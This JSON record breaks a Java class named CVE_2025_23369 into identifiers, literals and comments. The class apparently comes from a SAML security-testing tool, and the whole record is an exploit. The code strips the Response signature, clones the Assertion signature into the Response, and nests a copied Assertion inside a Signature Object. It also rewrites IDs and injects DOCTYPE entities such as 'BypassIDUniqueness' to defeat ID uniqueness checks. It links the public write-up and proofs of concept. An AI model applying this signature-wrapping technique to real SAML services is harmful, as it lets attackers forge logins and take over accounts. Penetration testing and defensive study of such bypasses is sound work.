{
    "identifiers": [
        "helpers",
        "org",
        "w3c",
        "dom",
        "Document",
        "org",
        "w3c",
        "dom",
        "Element",
        "org",
        "w3c",
        "dom",
        "Node",
        "org",
        "w3c",
        "dom",
        "NodeList",
        "org",
        "xml",
        "sax",
        "SAXException",
        "java",
        "io",
        "java",
        "util",
        "java",
        "util",
        "CVE",
        "samlMessage",
        "xmlHelpers",
        "xmlHelpers",
        "getXMLDocumentOfSAMLMessage",
        "samlMessage",
        "response",
        "getElementsByTagNameNS",
        "item",
        "assertion",
        "getElementsByTagNameNS",
        "item",
        "response",
        "assertion",
        "sigNodes",
        "getElementsByTagNameNS",
        "signatureList",
        "i",
        "i",
        "sigNodes",
        "getLength",
        "i",
        "signatureList",
        "add",
        "sigNodes",
        "item",
        "i",
        "responseID",
        "response",
        "getAttribute",
        "sig",
        "signatureList",
        "refList",
        "sig",
        "getElementsByTagNameNS",
        "refList",
        "getLength",
        "refList",
        "item",
        "uri",
        "getAttribute",
        "uri",
        "startsWith",
        "uri",
        "uri",
        "substring",
        "uri",
        "equals",
        "responseID",
        "sig",
        "getParentNode",
        "removeChild",
        "sig",
        "assertionID",
        "assertion",
        "getAttribute",
        "assertionSignature",
        "remainingSigs",
        "getElementsByTagNameNS",
        "i",
        "i",
        "remainingSigs",
        "getLength",
        "i",
        "sig",
        "remainingSigs",
        "item",
        "i",
        "refList",
        "sig",
        "getElementsByTagNameNS",
        "refList",
        "getLength",
        "refList",
        "item",
        "uri",
        "getAttribute",
        "uri",
        "startsWith",
        "uri",
        "uri",
        "substring",
        "uri",
        "equals",
        "assertionID",
        "assertionSignature",
        "sig",
        "assertionSignature",
        "assertionSignature",
        "getParentNode",
        "isSameNode",
        "response",
        "clonedSig",
        "assertionSignature",
        "cloneNode",
        "issuerList",
        "response",
        "getElementsByTagNameNS",
        "issuerList",
        "getLength",
        "issuer",
        "issuerList",
        "item",
        "parent",
        "issuer",
        "getParentNode",
        "nextSibling",
        "issuer",
        "getNextSibling",
        "nextSibling",
        "parent",
        "insertBefore",
        "clonedSig",
        "nextSibling",
        "parent",
        "appendChild",
        "clonedSig",
        "response",
        "appendChild",
        "clonedSig",
        "objectNode",
        "createElementNS",
        "objectNode",
        "setAttribute",
        "clonedSig",
        "appendChild",
        "objectNode",
        "objectNode",
        "appendChild",
        "assertion",
        "cloneNode",
        "originalAssertionID",
        "assertion",
        "getAttribute",
        "assertion",
        "setAttribute",
        "originalAssertionID",
        "assertionChildren",
        "assertion",
        "getChildNodes",
        "i",
        "i",
        "assertionChildren",
        "getLength",
        "i",
        "child",
        "assertionChildren",
        "item",
        "i",
        "child",
        "getNodeType",
        "Node",
        "ELEMENT_NODE",
        "childElem",
        "child",
        "equals",
        "childElem",
        "getLocalName",
        "assertion",
        "removeChild",
        "childElem",
        "doctypeEntities",
        "response",
        "setAttribute",
        "responseChildNodes",
        "response",
        "getChildNodes",
        "i",
        "i",
        "responseChildNodes",
        "getLength",
        "i",
        "child",
        "responseChildNodes",
        "item",
        "i",
        "child",
        "getNodeType",
        "Node",
        "ELEMENT_NODE",
        "equals",
        "child",
        "getLocalName",
        "objectNodes",
        "child",
        "getElementsByTagNameNS",
        "j",
        "j",
        "objectNodes",
        "getLength",
        "j",
        "objectElem",
        "objectNodes",
        "item",
        "j",
        "assertionNodes",
        "objectElem",
        "getElementsByTagNameNS",
        "assertionNodes",
        "getLength",
        "objectAssertion",
        "assertionNodes",
        "item",
        "objAssertionID",
        "objectAssertion",
        "getAttribute",
        "objectAssertion",
        "setAttribute",
        "objAssertionID",
        "doctypeEntities",
        "add",
        "format",
        "objAssertionID",
        "doctypeEntities",
        "add",
        "format",
        "doctypePayload",
        "entity",
        "doctypeEntities",
        "doctypePayload",
        "append",
        "entity",
        "doctypePayload",
        "append",
        "doctypeEntities",
        "clear",
        "samlMessage",
        "xmlHelpers",
        "getStringOfDocument",
        "samlMessage",
        "samlMessage",
        "replace",
        "declarationEnd",
        "samlMessage",
        "indexOf",
        "declarationEnd",
        "samlMessage",
        "substring",
        "declarationEnd",
        "doctypePayload",
        "samlMessage",
        "substring",
        "declarationEnd",
        "xmlDeclaration",
        "xmlDeclaration",
        "doctypePayload",
        "samlMessage"
    ],
    "literals": [
        "\"CVE-2025-23369\"",
        "\"*\"",
        "\"Response\"",
        "\"*\"",
        "\"Assertion\"",
        "\"No 'Response' element found.\"",
        "\"No 'Assertion' element found.\"",
        "\"*\"",
        "\"Signature\"",
        "\"ID\"",
        "\"*\"",
        "\"Reference\"",
        "\"URI\"",
        "\"#\"",
        "\"ID\"",
        "\"*\"",
        "\"Signature\"",
        "\"*\"",
        "\"Reference\"",
        "\"URI\"",
        "\"#\"",
        "\"*\"",
        "\"Issuer\"",
        "\"http://www.w3.org/2000/09/xmldsig#\"",
        "\"Object\"",
        "\"xmlns\"",
        "\"http://www.w3.org/2000/09/xmldsig#\"",
        "\"ID\"",
        "\"ID\"",
        "\"ffff\"",
        "\"Signature\"",
        "\"ID\"",
        "\"&idViaEntity;\"",
        "\"Signature\"",
        "\"*\"",
        "\"Object\"",
        "\"*\"",
        "\"Assertion\"",
        "\"ID\"",
        "\"ID\"",
        "\"&BypassIDUniqueness;\"",
        "\"<!ENTITY %s \\\"%s\\\">\\n\"",
        "\"idViaEntity\"",
        "\"<!ENTITY %s \\\"%s\\\">\\n\"",
        "\"BypassIDUniqueness\"",
        "\"&#x50;\"",
        "\"<!DOCTYPE response [\\n\"",
        "\"]>\"",
        "\"&amp;\"",
        "\"&\"",
        "\"?>\"",
        "\"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\n\""
    ],
    "variables": [],
    "comments": [
        "Links:",
        "Get the Response and Assertion elements.",
        "Get all Signature nodes.",
        "Copy into a list since we may remove nodes during iteration.",
        "Remove signature nodes that reference the Response element's ID.",
        "Locate the Reference element (assumes one exists per Signature).",
        "remove leading '#'",
        "Find the Signature node that references the Assertion's ID.",
        "Re-fetch remaining Signature nodes.",
        "If the found assertion signature is not already a child of the Response, clone it and attach it.",
        "Deep clone the signature.",
        "Try to locate an Issuer node within the Response.",
        "Insert the cloned signature immediately after the issuer.",
        "Fallback: simply append to the Response.",
        "Create an Object element with the proper XMLDSig namespace and explicitly set xmlns.",
        "force namespace to fix some errors",
        "Append a deep clone of the Assertion node to the Object node.",
        "Change the Assertion's ID attribute by appending \"ffff\".",
        "Remove any Signature element that is a direct child of the Assertion.",
        "DOCTYPE declaration hack to avoid usage of Java reflections",
        "Set the Response's ID attribute to a new fixed value.",
        "Look for a Signature > Object > Assertion chain inside the Response.",
        "Within this Signature, search for an Object node.",
        "Within Object, search for an Assertion node.",
        "Modify its ID by prefixing with \"BypassIDUniqueness\".",
        "static class"
    ],
    "docstrings": [
        "* https://repzret.blogspot.com/2025/02/abusing-libxml2-quirks-to-bypass-saml.html",
        "* https://github.com/hakivvi/CVE-2025-23369",
        "* https://github.com/d0ge/proof-of-concept-labs/tree/saml-libxml2/ruby-saml-libxml"
    ],
    "functions": [
        "apply",
        "CVE_2025_23369"
    ],
    "classes": [
        "CVE_2025_23369"
    ]
}